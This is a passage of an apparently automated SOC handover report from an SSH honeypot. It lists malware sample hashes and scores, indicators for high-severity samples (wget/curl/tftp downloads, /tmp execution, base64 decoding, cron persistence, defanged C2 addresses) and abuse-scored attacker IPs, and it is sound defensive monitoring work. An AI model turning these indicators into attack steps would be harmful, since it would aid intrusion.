| `3552f719a379865960a169e2dacea968f4e8f46bd31907f2f89df431d09d9d9e` | ELF Binary (Linux executable) (x86-64 64-bit) | `3552f719a3798659...` | 46/100 | 🟡 MEDIUM | **40/74** 🔴 |
| `3625cfdcd6d434bfa672753ef4b197df8a01388d220bafc9edfa2d0d29c7fcef` | ELF Binary (Linux executable) (x86-64 64-bit) | `3625cfdcd6d434bf...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `3625d068896953595e75df328676a08bc071977ac1ff95d44b745bbcb7018c6f` | ELF Binary (Linux executable) (ARM 32-bit) | `3625d06889695359...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `3910f46fe809d723d169b5723e0724dba7aed441a065b53b98e2f1b0a9736569` | ELF Binary (Linux executable) (MIPS 32-bit) | `3910f46fe809d723...` | 65/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` | ELF Binary (Linux executable) (x86 32-bit) | `3ad48bae18b7ea8e...` | 86/100 | 🔴 HIGH | **41/74** 🔴 |
| `40db9279ba409757c074048529be5bf8f141fa022489a965792e7f7de2223b78` | ELF Binary (Linux executable) (ARM 32-bit) | `40db9279ba409757...` | 62/100 | 🟡 MEDIUM | **32/74** 🔴 |
| `44689d3e1a7f460db2ecc14351c171f4910721257f83024c63cbc07f4e2b977c` | ELF Binary (Linux executable) (x86-64 64-bit) | `44689d3e1a7f460d...` | 35/100 | 🟢 LOW | **13/74** 🔴 |
| `4481c88954298a5e5e0f0d70cd011644e8442e1aeb0ce42cc3c8b4d51a637f02` | ELF Binary (Linux executable) (ARM 32-bit) | `4481c88954298a5e...` | 52/100 | 🟡 MEDIUM | **30/74** 🔴 |
| `47b268c21591069bfe4099833ad66b8138a53ab2dcb866e040d466aee1f8624c` | ELF Binary (Linux executable) (x86-64 64-bit) | `47b268c21591069b...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `494ab0439cd9a373aca71bf5107e0718a9e14b9b805632835c99c42b88a50984` | ELF Binary (Linux executable) (x86 32-bit) | `494ab0439cd9a373...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `526c830542c17e6883da850de8dc2c3c2ffc35b446f33c61892b193e50f8d8ed` | ELF Binary (Linux executable) (x86-64 64-bit) | `526c830542c17e68...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `59691617d4c9bfe4a9202c318e632faa7c8a2d5dfdb46297e27c1a33971f3530` | ELF Binary (Linux executable) (unknown (e_machine=0x2a) 32-bit) | `59691617d4c9bfe4...` | 54/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `59c29436755b0778e968d49feeae20ed65f5fa5e35f9f7965b8ed93420db91e5` | ELF Binary (Linux executable) (x86-64 64-bit) | `59c29436755b0778...` | 44/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `59da60e031a1bc0cadb4d5b62a9b3047c40c490738b5ca7ed367f4a8440561a3` | Unknown binary | `59da60e031a1bc0c...` | 0/100 | 🟢 LOW | 0/74 ✅ |
| `5f160094d291b41abe2e65a17c1b1c8a4aec041bf63c72cf01494b2ff37e20c9` | ELF Binary (Linux executable) (ARM 32-bit) | `5f160094d291b41a...` | 64/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `629db57b96d6e965401d866f895d86c542efe344b3d489630a6ec09d643add76` | ELF Binary (Linux executable) (x86-64 64-bit) | `629db57b96d6e965...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `64b8416c418c265ee1a7999470d9f688ad8204c1d85341e270e23649ee21e11b` | Python Script | `64b8416c418c265e...` | 67/100 | 🟡 MEDIUM | **19/74** 🔴 |
| `6aa904125beb01924243b0dd04e0988b16b8bccd5479224f8bbcd762814b303e` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `6aa904125beb0192...` | 61/100 | 🟡 MEDIUM | **27/73** 🔴 |
| `6d38d8be9058928878b583202c87b80fe8ff66b347e0d325a3c2b956094bfe7c` | ELF Binary (Linux executable) (MIPS 32-bit) | `6d38d8be90589288...` | 53/100 | 🟡 MEDIUM | **34/74** 🔴 |
| `725d1de20672ed85f32e823fe067ed6eb17149019e146bafbbe59338df78e37f` | Bash Script | `725d1de20672ed85...` | 85/100 | 🔴 HIGH | **39/74** 🔴 |
| `75737a0d2987fb60d7a1f17ff2a7122132545e84a327e3a5372be51500a3be12` | ELF Binary (Linux executable) (x86-64 64-bit) | `75737a0d2987fb60...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `765289f938cc2bd64c9778dbabe048afa8ac3277a150c940d2730c14d24687b5` | ELF Binary (Linux executable) (x86-64 64-bit) | `765289f938cc2bd6...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `77ed8c7518a32663fb766f729075dcdddc355c8d6ebe381092df51bb891e0cfc` | ELF Binary (Linux executable) (x86 32-bit) | `77ed8c7518a32663...` | 44/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `783adb7ad6b16fe9818f3e6d48b937c3ca1994ef24e50865282eeedeab7e0d59` | Bash Script | `783adb7ad6b16fe9...` | 60/100 | 🟡 MEDIUM | **27/74** 🔴 |
| `7a4a3a129b726b531941b41d734521e8905d57a57a7e8a0a7e5dff41ed22f6ba` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `7a4a3a129b726b53...` | 86/100 | 🔴 HIGH | **40/74** 🔴 |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 46/100 | 🟡 MEDIUM | **40/73** 🔴 |
| `7b61a0032297d2b400d3dd5e69556a8ca31adb717464c247aaf997f4b4de26f6` | Unknown binary | `7b61a0032297d2b4...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `80c3fe2ae1062abf56456f52518bd670f9ec3917b7f85e152b347ac6b6faf880` | Unknown binary | `80c3fe2ae1062abf...` | 0/100 | 🟢 LOW | 0/74 ✅ |

**Suspicious Indicators — HIGH Severity Samples:**

_`197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` (197c74408e15bd1168105f56...)_
- `Execution from /tmp` — `/tmp/clean_file`
- `Base64 decode (obfuscation)` — `base64 -d`
- `Cron persistence` — `crontab`

_`3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` (3ad48bae18b7ea8e7ffe3608...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`725d1de20672ed85f32e823fe067ed6eb17149019e146bafbbe59338df78e37f` (725d1de20672ed85f32e823f...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `chmod +x (make executable)` — `chmod +x`
- `IP:Port (possible C2)` — `51.158.248[.]122:8517`

_`7a4a3a129b726b531941b41d734521e8905d57a57a7e8a0a7e5dff41ed22f6ba` (7a4a3a129b726b531941b41d...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `107.173.127[.]185` | US | HostPapa | **100** ⚠️ | 3 |
| `36.64.33[.]82` | ID | PT TELKOM INDONESIA Menara Multimedia Lt.7 Jl. Kebon sirih No.12 JAKARTA | **100** ⚠️ | 50 |
| `197.251.249[.]117` | GH | Ghana Telecommunications Company Limited | **100** ⚠️ | 29 |
| `61.12.86[.]90` | IN | TTSL-ISP DIVISION | **100** ⚠️ | 50 |
| `222.92.61[.]242` | CN | CHINANET jiangsu province network | **100** ⚠️ | 50 |
| `182.79.218[.]164` | IN | BHARTI-AIRTEL | **100** ⚠️ | 50 |
| `66.132.172[.]185` | US | Censys, Inc. | **100** ⚠️ | 50 |
| `43.110.36[.]163` | US | Alibaba Cloud (Singapore) Private Limited | **100** ⚠️ | 2 |
| `203.92.36[.]109` | IN | Shyam Spectra Pvt Ltd | **100** ⚠️ | 50 |
| `122.186.249[.]6` | IN | BHARTI TELENET LTD. NEW DELHI | **100** ⚠️ | 11 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 91 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 82 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 8 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 7 |

---

## 🔕 False Positive Summary (14 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 3 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 11 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 158 cases |
| Tool 34  | Credential Extractor        | ✅ 128 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 16 fingerprints |
| Tool 36  | Command Clustering          | ✅ 3 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 80 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 14 filtered (8.9%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 56 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 31 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 82 priority case(s) shown individually · 16 recon entry/entries in table (6 group(s) consolidating 52 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json auto-generated from pipeline.yml each run — tracks all active tools, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-07-14T19:26:29Z_
